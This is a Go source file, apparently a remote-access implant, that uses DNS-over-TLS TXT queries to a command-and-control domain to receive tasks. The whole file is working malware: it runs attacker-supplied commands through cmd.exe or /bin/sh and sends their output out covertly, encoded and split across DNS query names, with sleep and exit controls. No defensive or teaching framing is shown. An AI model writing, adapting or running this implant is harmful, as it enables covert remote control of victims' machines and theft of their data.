package main

import (
	"fmt"
	"github.com/jxskiss/base62"
	"github.com/miekg/dns"
	"math"
	"math/rand"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

var wg = sync.WaitGroup{}

const c2addr = ".r.rce.moe."//必须以点开头结尾

const addrstr = "123.125.81.6:853" // 123.125.81.6:853 (360 DNS) DoT

//const addrstr = "8.8.8.8:53"
const payloadlen = 70.00
const retry = 10
const t = 10 //多线程
var sleep = 10
var clientid = ""

func send(data []byte, packnumer string, mapnumer string, ch chan bool) {
	defer wg.Done()
	trytimes := 0
	ch <- true
	m := new(dns.Msg)
	m.SetQuestion(packnumer+"-"+mapnumer+"-"+string(base62.Encode(data))+c2addr, dns.TypeTXT)
	//cl := &dns.Client{}
	cl := &dns.Client{Net: "tcp-tls"}
SEND1:
	in, _, err := cl.Exchange(m, addrstr)
	if err != nil {
		println("conn err retry \n%v", in)
		if trytimes > retry {
			println("senddata err ")
			<-ch
			return
		}
		trytimes += 1
		goto SEND1
	}
	if in == nil || in.Rcode != dns.RcodeSuccess {
		println("invalid answer retry \n%v", in)
		if trytimes > retry {
			println("senddata err")
			<-ch
			return
		}
		trytimes += 1
		goto SEND1
	}

	<-ch
}
func senddata(data []byte, packnumer string) {
	//trytimes := 0
	ch := make(chan bool, t)
	if (float64(len(data))*1.35 + float64(len(c2addr)+len(packnumer)+1+1+6)) < (payloadlen) {
		wg.Add(1)
		send(data, packnumer, "ffffff", ch)

	} else {
		/*需要分片*/
		limitlen := int(math.Floor((payloadlen - float64(len(c2addr)+len(packnumer)+1+1+6)) / 1.35))
		//分片最大数量 16777215 可以修改 575Mb
		// 包序号-分片序号-数据.addr
		times := int(math.Ceil(float64(len(data)) / float64(limitlen)))
		if times > 16777215 {
			println("senddata err")
			return
		}
		println("max bits ", 16777215*limitlen)
		var tempdata []byte
		for i := 0; i < times; i++ {

			if i*limitlen+limitlen < len(data) {
				tempdata = data[(i * limitlen) : (i+1)*limitlen]
			} else {
				tempdata = data[(i * limitlen):]
			}
			if i != (times - 1) {
				wg.Add(1)
				go send(tempdata, packnumer, strconv.FormatInt(int64(i), 16), ch)
			} else {
			}

		}
		wg.Wait()
		wg.Add(1)
		send(tempdata, packnumer, "ffffff", ch) //阻塞  最后一个包
		print("发送完毕")
	}
}

func main() {
	rand.Seed(time.Now().UnixNano())
	clientid = strconv.FormatInt(int64(100000+rand.Intn(900000)), 16)
	m := new(dns.Msg)
	m.SetQuestion(strconv.FormatInt(int64(time.Now().Unix()), 16)+c2addr, dns.TypeTXT)

	for {
		m := new(dns.Msg)
		m.SetQuestion(strconv.FormatInt(int64(time.Now().Unix()), 16)+"-"+clientid+c2addr, dns.TypeTXT)
		cl := &dns.Client{Net: "tcp-tls"}
		in, _, err := cl.Exchange(m, addrstr)
		if err != nil {
			println(err)
		}

		if in != nil {
			if in.Rcode == dns.RcodeSuccess {
				for _, answer := range in.Answer {
					if answer.Header().Rrtype == dns.TypeTXT {
						for _, txt := range answer.(*dns.TXT).Txt {
							cmdarr := strings.Split(txt, "|")
							//taskid|tasktype|taskdata
							if len(cmdarr) != 3 {
								continue
							}
							taskdata, err := base62.Decode([]byte(cmdarr[2]))
							if err != nil {
								senddata([]byte("Decode taskdata error"), cmdarr[0])
								continue
							}
							switch cmdarr[1] {
							case "1":
								fmt.Printf("exec cmd")
								if runtime.GOOS == "windows" {
									cmd := exec.Command("cmd.exe", "/c", string(taskdata))
									output, err := cmd.Output()
									if err != nil {
										senddata([]byte(err.Error()), cmdarr[0])
									}
									senddata(output, cmdarr[0])
								} else {
									cmd := exec.Command("/bin/sh", "-c", string(taskdata))
									output, err := cmd.Output()
									if err != nil {
										senddata([]byte(err.Error()), cmdarr[0])
									}
									senddata(output, cmdarr[0])
								}
							case "2": //sleep
								s, err := strconv.Atoi(string(taskdata))
								if err == nil {
									sleep = s
								}

							case "3": //exit
								os.Exit(0)
							default:
								continue
							}

							println(txt)
						}
					}
				}
			}
		}
		time.Sleep(time.Second * time.Duration(sleep))
	}

}
